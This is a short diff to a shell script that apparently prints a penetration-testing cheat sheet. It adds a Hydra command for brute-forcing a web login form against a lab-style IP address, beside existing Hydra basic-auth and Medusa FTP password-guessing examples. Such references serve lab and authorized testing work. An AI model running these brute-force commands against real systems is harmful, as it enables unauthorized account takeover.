@@ -213,6 +213,10 @@ echo ${reset}${red}${bold}
 echo "Hydra against basic authentication"
 echo ${reset}${green}
 echo "hydra -l bob -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt  -e ns http-get://$IP/protected"
+echo ${reset}${red}${bold}
+echo "Hydra against form post authentication"
+echo ${reset}${green}
+echo "hydra -L user -P pass 10.10.114.147 http-post-form '/login:username=^USER^&password=^PASS^:incorrect' "
 echo FTP user with password list
 echo ${reset}${green}
 echo "medusa -h $ip -u user -P passwords.txt -M ftp"
